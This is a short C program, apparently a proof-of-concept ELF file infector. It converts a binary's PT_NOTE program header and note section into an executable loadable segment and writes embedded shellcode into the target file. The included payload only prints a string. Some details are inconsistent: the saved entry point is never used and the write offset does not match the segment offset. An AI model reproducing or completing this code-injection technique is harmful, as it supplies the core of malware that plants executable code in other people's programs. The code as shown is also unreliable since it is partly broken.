#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	int fd;
	Elf64_Addr orig_entry;
	void *addr = NULL;
	struct stat s;
	char bytes[] = "\x48\x89\xe5\x48\xb8\x27\x64\x21\x21\x21\x21\x21\x0a\x50\x48\xb8\x75\x6e\x73\x74\x34\x62\x31\x33\x50\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb6\x01\x48\x8d\x75\xf0\x48\x31\xd2\xb2\x10\x0f\x05\x58\x58\x48\x89\xec\x5d\xc3";
	
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;

	fd = open(argv[1], O_RDWR);
	if(fd == -1)
		return fd;

	if(stat(argv[1], &s) != 0) 
		return -1;

	addr = mmap(NULL, s.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if(!addr) 
		return -1;
	
	//cast everything
	ehdr = (Elf64_Ehdr *)addr;
	phdr = (Elf64_Phdr *)(addr + ehdr->e_phoff);
	shdr = (Elf64_Shdr *)(addr + ehdr->e_shoff);

	//save initial entry to jump back to
	orig_entry = ehdr->e_entry;
	printf("Type: %d\n", ehdr->e_type);

	//program headers	
	for(int i = 0; i < ehdr->e_phnum; i++) {
		if(phdr[i].p_type == PT_NOTE) {
			phdr[i].p_type = PT_LOAD;	
			phdr[i].p_vaddr = (Elf64_Addr)0x22300;
			phdr[i].p_paddr = (Elf64_Addr)0x22300;
			phdr[i].p_offset = 0x21300;
			phdr[i].p_flags =  PF_R | PF_X;
			phdr[i].p_align = 0x1000;
			phdr[i].p_filesz = sizeof(bytes);

			break;
		}
	}	

	//section headers
	for(int i = 0; i < ehdr->e_shnum; i++) {
		if(shdr[i].sh_type == SHT_NOTE) {
			shdr[i].sh_type = SHT_PROGBITS;
			shdr[i].sh_addr = (Elf64_Addr)0x22300;
			shdr[i].sh_offset = 0x21300;
			shdr[i].sh_size = sizeof(bytes); 
			shdr[i].sh_flags = SHF_ALLOC | SHF_EXECINSTR;
			shdr[i].sh_addralign = 0;
			break;
		}	
	}

	//write bytes to segment
	
	lseek(fd, 0x22300, SEEK_SET);	
	write(fd, bytes, sizeof(bytes));
	close(fd);

	return 0;
}
	
